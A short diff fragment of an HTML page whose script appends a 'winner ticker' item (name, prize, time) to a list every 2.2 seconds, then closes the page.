+    li.className = 'winner-ticker-item';
+    li.innerHTML = `<span class="winner-name">${data.name}</span><span class="winner-prize">${data.prize}</span><span class="winner-time">${data.time}</span>`;
+    tickerList.appendChild(li);
+}, 2200);
+</script>
+</body>
+</html>
